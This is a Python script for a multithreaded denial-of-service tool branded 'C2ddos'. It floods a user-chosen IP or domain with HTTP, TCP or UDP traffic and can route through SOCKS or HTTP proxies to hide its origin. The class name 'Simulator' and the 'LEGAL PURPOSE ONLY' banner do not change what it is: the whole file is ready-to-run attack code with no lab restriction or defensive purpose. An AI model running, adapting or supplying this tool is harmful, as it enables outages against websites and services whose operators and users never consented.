import socket
import time
import threading
import random
import ssl
from argparse import ArgumentParser

try:
    import socks  # Install with: pip install pysocks
except ImportError:
    socks = None

# ===== ASCII BANNER =====
BANNER = """

█▀█ █ █▄░█ █▀█ █▄█   ▀▄▀ █▀█ █░░ █▀█ █ ▀█▀ █▀ █▀▀ █▀▀  
█▀▀ █ █░▀█ █▄█ ░█░   █░█ █▀▀ █▄▄ █▄█ █ ░█░ ▄█ ██▄ █▄▄  
                        
                        OWNER: John Becamon | VERSION: 4.0 | LEGAL X | C2ddos
"""

class BrutalDDoSSimulator:
    def __init__(self, target, port, protocol, delay=0.01, threads=100, duration=30, use_proxy=False, proxy_type=None, proxy_host=None, proxy_port=None, use_ssl=False):
        self.target = target
        self.port = port
        self.protocol = protocol.lower()
        self.delay = delay
        self.threads = threads
        self.duration = duration
        self.stop_flag = False
        self.use_proxy = use_proxy
        self.proxy_type = proxy_type
        self.proxy_host = proxy_host
        self.proxy_port = proxy_port
        self.use_ssl = use_ssl

    def _create_socket(self):
        if self.use_proxy and socks:
            s = socks.socksocket()
            if self.proxy_type == "socks4":
                s.set_proxy(socks.SOCKS4, self.proxy_host, self.proxy_port)
            elif self.proxy_type == "socks5":
                s.set_proxy(socks.SOCKS5, self.proxy_host, self.proxy_port)
            elif self.proxy_type == "http":
                s.set_proxy(socks.HTTP, self.proxy_host, self.proxy_port)
        else:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM if self.protocol != "udp" else socket.SOCK_DGRAM)
        
        if self.use_ssl and self.protocol == "http":
            s = ssl.wrap_socket(s)
        
        return s

    def http_flood(self):
        headers = [
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Accept-Language: en-US,en;q=0.5",
            "Connection: keep-alive"
        ]
        while not self.stop_flag:
            try:
                s = self._create_socket()
                s.connect((self.target, self.port))
                s.send(
                    f"GET /{random.randint(1, 1000)} HTTP/1.1\r\n"
                    f"Host: {self.target}\r\n"
                    f"{random.choice(headers)}\r\n"
                    "\r\n".encode()
                )
                time.sleep(self.delay * 10)  # Keep connection open longer
                s.close()
            except:
                pass

    def tcp_flood(self):
        while not self.stop_flag:
            try:
                s = self._create_socket()
                s.connect((self.target, self.port))
                s.send(b"X" * random.randint(100, 2048))  # Random junk data
                s.close()
            except:
                pass
            time.sleep(self.delay)

    def udp_flood(self):
        while not self.stop_flag:
            try:
                s = self._create_socket()
                s.sendto(b"X" * random.randint(100, 2048), (self.target, self.port))
                s.close()
            except:
                pass
            time.sleep(self.delay)

    def start(self):
        print(BANNER)
        print(f"\n🚀 Starting BRUTAL {self.protocol.upper()} flood on {self.target}:{self.port}...")
        print(f"🔥 Threads: {self.threads} | Delay: {self.delay}s | Duration: {self.duration}s")
        if self.use_proxy:
            print(f"🔌 Proxy: {self.proxy_type.upper()} ({self.proxy_host}:{self.proxy_port})")
        if self.use_ssl:
            print("🔒 Encrypted Traffic: YES (HTTPS/TLS)")
        print()

        for _ in range(self.threads):
            if self.protocol == "http":
                thread = threading.Thread(target=self.http_flood)
            elif self.protocol == "tcp":
                thread = threading.Thread(target=self.tcp_flood)
            elif self.protocol == "udp":
                thread = threading.Thread(target=self.udp_flood)
            else:
                print("❌ Invalid protocol. Use HTTP/TCP/UDP.")
                return
            thread.daemon = True
            thread.start()

        time.sleep(self.duration)
        self.stop_flag = True
        print("\n✅ Attack Killed.")

if __name__ == "__main__":
    print(BANNER)
    print("⚠️ LEGAL PURPOSE ONLY | BY LEGAL X! ⚠️\n")

    target = input("Target IP/Domain: ").strip()
    port = int(input("Port (default 80): ").strip() or 80)
    protocol = input("Protocol (HTTP/TCP/UDP, default HTTP): ").strip().lower() or "http"
    delay = float(input("Delay between requests (default 0.01s): ").strip() or 0.01)
    threads = int(input("Threads (default 100): ").strip() or 100)
    duration = int(input("Duration in seconds (default 30): ").strip() or 30)

    use_proxy = input("Use proxy? (y/n, default n): ").strip().lower() == "y"
    proxy_type, proxy_host, proxy_port = None, None, None
    if use_proxy:
        proxy_type = input("Proxy type (SOCKS4/SOCKS5/HTTP, default SOCKS5): ").strip().lower() or "socks5"
        proxy_host = input("Proxy host/IP: ").strip()
        proxy_port = int(input("Proxy port (default 1080): ").strip() or 1080)

    use_ssl = input("Use HTTPS/TLS encryption? (y/n, default n): ").strip().lower() == "y"

    simulator = BrutalDDoSSimulator(
        target, port, protocol, delay, threads, duration,
        use_proxy, proxy_type, proxy_host, proxy_port, use_ssl
    )
    simulator.start()
